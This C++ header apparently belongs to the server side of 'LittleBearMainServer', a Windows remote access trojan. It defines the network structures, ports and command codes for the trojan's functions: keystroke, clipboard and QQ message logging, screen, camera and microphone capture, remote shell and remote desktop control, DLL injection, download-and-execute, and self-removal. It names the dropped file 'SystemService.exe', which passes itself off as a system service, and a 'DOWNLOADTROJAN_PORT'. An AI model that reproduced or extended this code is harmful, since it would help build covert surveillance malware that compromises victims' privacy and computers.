#pragma once
#ifndef LITTLEBEARMAINSERVER_H_H_H
#define LITTLEBEARMAINSERVER_H_H_H

#include <Windows.h>
#include "zconf.h"
#include "zlib.h"
#include <map>

#pragma comment(lib,"zlib.lib")

using namespace std;

//#define NEED_LOGIN_WINDOW 
//#define WM_SET_CAPTION_TEXT WM_USER + 0x1000

#define WINDOW_ICON  0x1100


#define MAX_USERNAME_SIZE 16

#define USE_MYSQL

#define USE_USERNAME

#pragma pack(1)

typedef struct {

	int name1len;
	char name1[16];
	int name2len;
	char name2[16];
}DOUBLESTRINGPARAM, * LPDOUBLESTRINGPARAM;


typedef struct {
	int screenx;
	int screeny;
	int bitsperpix;
}STREMOTECONTROLPARAMS, * LPSTREMOTECONTROLPARAMS;

typedef struct {
	POINT pos;
	POINT size;
}REMOTECONTROLMOUSEPOS, * LPREMOTECONTROLMOUSEPOS;

typedef struct {
	unsigned char key;
	unsigned char shiftkey;
}REMOTECONTROLKEY, * LPREMOTECONTROLKEY;




typedef struct
{
	unsigned char cMAC[6];
	unsigned char crypt;
	unsigned char compress;
	DWORD dwVolumeNO;
	unsigned char username[MAX_USERNAME_SIZE];
}UNIQUECLIENTSYMBOL, * LPUNIQUECLIENTSYMBOL;

typedef struct {
	int cmd;
	UNIQUECLIENTSYMBOL unique;
	int packlen;
}NETWORKPACKETHEADER, * LPNETWORKPACKETHEADER;


typedef struct {
	NETWORKPACKETHEADER packhdr;
	int len;
}NETWORKFILEHDR, * LPNETWORKFILEHDR;

typedef struct
{
	UNIQUECLIENTSYMBOL stUnique;
	sockaddr_in stAddr;
	SOCKET hSock;
	time_t tmLastOnlineTime;
	char* lpRecvDataBuf;
	DWORD dwType;
	DWORD dwThreadID;
	DWORD dwLiveFlag;
}ONLINEINFO, * LPONLINEINFO;


typedef struct
{
	SOCKET			hSockClient;
	sockaddr_in		stAddrClient;
	DWORD			dwThreadID;
	char			szCurrentPath[MAX_PATH];
}NETWORKPROCPARAM, * LPNETWORKPROCPARAM;

typedef struct
{
	sockaddr_in saClient;
	SOCKET sClient;
}STCLIENTSOCKINFO, * LPSTCLIENTSOCKINFO;


typedef struct {
	SOCKET					hSockClient;
	sockaddr_in				stAddrClient;
	int* lpControlWindowClose;
	HWND					hwndWindow;
	char* lpClientBitmap;
	int						bufLimit;
	int* lpbmpDataSize;
	UNIQUECLIENTSYMBOL		unique;
	STREMOTECONTROLPARAMS	param;
}REMOTE_CONTROL_PARAM, * LPREMOTE_CONTROL_PARAM;

typedef struct {
	int delta;
	int xy;
}REMOTECONTROLWHEEL, * LPREMOTECONTROLWHEEL;


typedef struct {
	DWORD		dwType;
	POINT		stPT;
	DWORD		dwTickCnt;
	int			iDelta;
}STMOUSEACTION, * LPMOUSEACTION;

#pragma pack()


#define FILE_TRANSFER_ZERO			0X1FFFFFFE
#define FILE_TRANSFER_TOO_BIG		0X1FFFFFFF
#define FILE_TRANSFER_NOT_FOUND		0X2FFFFFFF
#define RECV_DATA_OK				0X3FFFFFFF
#define HEARTBEAT					0X7FFFFFFF
#define QUERYSERVERCOMMAND			0XFFFFFFFF
#define SCREENSNAPSHOT				1
#define ONLINE						2
#define SYSTEMINFO					3
#define UPLOADFILE					4
#define HARDDISKALLFILE				5
#define DOWNLOADFILE				6
#define SHELLCOMMAND				7
#define KEYBOARDRECORD				8
#define APPSCREENSNAPSHOT			9
#define SCREENVIDEO					10
#define SOUNDRECORD					11
#define CAMERAPHOTO					12
#define CAMERAVIDEO					13
#define DISKFILERECORD				14
#define CLIPBOARDRECORD				15
#define INJECTDLL					16
#define QQMSGRECORD					17
#define SUICIDE						18
#define COMMANDRESULT				19
#define REMOTECONTROL				20
#define REMOTE_CLIENT_SCREEN		21
#define REMOTE_MOUSE_POS			22
#define REMOTE_LEFTBUTTONDOWN		23
#define REMOTE_LEFTBUTTONDOUBLECLICK 24
#define REMOTE_RBUTTONDOWN			25
#define REMOTE_RBUTTONDOUBLECLICK	26
#define REMOTE_KEYBOARD				27
#define REMOTECONTROL_END			28
#define REMOTE_MOUSEWHEEL			29
#define REMOTE_OLD_SCREEN			30
#define LOGINFORMATIONFILE			31
#define USBALLFILES					32
#define RUNNING_APPS				33
#define INSTALLED_APPS				34
#define REMOTECONTROL_PARAMS		35
#define MESSAGEBOX					36
#define DOWNLOADRUNEXE				37
#define DOWNLOADRUNDLL				38
#define REMOTE_NONE_SCREEN			39
#define DOWNLOADPROGRAM				40

#define NETWORK_DATAPORT			20011
#define NETWORK_CMDPORT				20012
#define REMOTE_CONTROLPORT			20013
#define DOWNLOADTROJAN_PORT			2001
#define DOWNLOADPROGRAM_PORT		2002

#define MAX_BUF_SIZE				0x10000000
#define CMD_BUFFER_SIZE				0x1000
#define NETWORK_BUF_SIZE			0x4000


//#define REMOTECONTROL_BUFFER_SIZE	0x1000000
//for command,upload,download,if platform is windows xp or server 2003,the max value is 32M or will 10055 error
#define WSASTARTUP_VERSION			0x0202
#define ONLINE_REFRESH_TIME			6000
#define MAC_ADDRESS_LENGTH			6
#define MAX_WSPRINTF_BUFFER_SIZE	1024
#define MAX_SERVER_LISTEN_COUNT		16
#define DATASOCK_TIME_OUT_VALUE		30000
#define CMDSOCK_TIME_OUT_VALUE		180000
#define COMMAND_LOOP_DELAY			1000
#define HEARTBEAT_LOOP_DELAY		120000
#define NETWORK_ERROR_CODE			-1
#define DATACRYPT					1
#define DATANONECRYPT				0
#define DATACOMPRESS				1
#define DATANONECOMPRESS			0
#define DATA_THREAD					1
#define COMMAND_THREAD				2
#define REMOTE_CONTROL_THREAD		3

#define TROJANICO_FILE_NAME					"SystemService.ico"
#define TROJAN_FILE_NAME					"SystemService.exe"
#define SERVER_MUTEX_NAME					"LittleBearMainServer_Mutex"
#define UPLOAD_FILE_DIR_NAME				"upload_files"
#define DOWNLOAD_FILE_DIR_NAME				"download_files"
#define COMMAND_DIR_NAME					"command"
#define CLIENT_ONLINE_FILE_NAME				"client_online.txt"
#define THREAD_INFO_FILE_NAME				"thread_info.txt"	
#define DOWNLOADPROGRAM_PATH				"DownloadProgram"

#define IP_CONFIG_FILE				"ip.txt"
#define LOGFILENAME					"log.txt"

#define ONLINEFILENAME				"online.txt"
#define SYSTEMINFOFILENAME			"systeminfo.json"
#define ALLDISKFILENAME				"harddiskfiles.txt"
#define CLIPBOARDFILENAME			"clipboard.txt"
#define KEYBOARDFILENAME			"keyboard.txt"
#define QQRECORDFILENAME			"qqrecord.txt"
#define DISKRECORDFILENAME			"diskfilerecord.txt"
#define CMDRESULTFILENAME			"cmdresult.txt"
#define LOGRECORDFILENAME			"running_log.txt"
#define DISKUALLFILESFILENAME		"usbfiles.txt"
#define RUNNINGAPPSFILENAME			"runningApps.json"
#define INSTALLEDAPPSFILENAME		"installedApps.json"

#define SCRNSNAPSHOTCOMMANDFILE		"scrnsnapshotcommand.txt"
#define APPSCRNSHOTCOMMANDFILE		"appscrnshotcommand.txt"
#define SYSTEMINFOCOMMANDFILE		"systeminfocommand.txt"
#define RUNNINGAPPSCOMMANDFILE		"runningappscommand.txt"
#define INSTALLAPPSCOMMANDFILE		"installappscommand.txt"
#define HDALLFILESCOMMANDFILE		"hdallfilescommand.txt"
#define UPLOADFILECOMMANDFILE		"uploadfilecommand.txt"
#define DOWNLOADFILECOMMANDFILE		"downloadfilecommand.txt"
#define SHELLCOMMANDFILE			"shellcommand.txt"
#define SOUNDRECORDCOMMANDFILE		"soundrecordcommand.txt"
#define SCREENVIDEOCOMMANDFILE		"screenvideocommand.txt"
#define CLIPBOARDCOMMANDFILE		"clipboardcommand.txt"
#define KEYBOARDCOMMANDFILE			"keyboardcommand.txt"
#define CAMERAPHOTOCOMMANDFILE		"cameraphotocommand.txt"
#define CAMERAVIDEOCOMMANDFILE		"cameravideocommand.txt"
#define INJECTDLLCOMMANDFILE		"injectdllcommand.txt"
#define SUICIDECOMMANDFILE			"suicidecommand.txt"
#define DISKRECORDCOMMANDFILE		"diskrecordcommand.txt"
#define REMOTECONTROLCOMMANDFILE	"remotecontrolcommand.txt"
#define DOWNLOADRUNEXECOMMANDFILE	"downloadrunexecommand.txt"
#define MESSAGEBOXCOMMANDFILE		"messageboxcommand.txt"





extern DWORD dwIP;

extern map <HWND, REMOTE_CONTROL_PARAM> RemoteCtrlParamMap;

extern map<HWND, REMOTE_CONTROL_PARAM >::iterator mapit;

extern unsigned char RemoteClientKey[4];
extern STMOUSEACTION RemoteClientLButtonClick;
extern STMOUSEACTION RemoteClientLButtonDoubleClick;
extern STMOUSEACTION RemoteClientRButtonClick;
extern STMOUSEACTION RemoteClientRButtonDoubleClick;


int InitProgram();



#endif

